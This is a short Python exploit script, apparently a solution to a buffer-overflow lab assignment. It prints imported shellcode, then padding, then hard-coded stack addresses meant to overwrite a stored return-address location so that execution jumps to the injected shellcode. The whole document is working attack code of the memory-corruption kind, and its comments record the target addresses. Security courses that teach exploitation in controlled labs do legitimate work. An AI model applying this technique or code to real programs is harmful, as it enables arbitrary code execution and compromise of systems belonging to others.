#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
# return address 08048915
# return address stored fffed93c
# fffed130 shellcode
#print("eeee")
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(pack("<B", 0x33))
for i in range(506):
	sys.stdout.buffer.write(pack("<I", 0xeeeeeeee))
sys.stdout.buffer.write(pack("<I", 0xfffed130))
sys.stdout.buffer.write(pack("<I", 0xfffed93c))
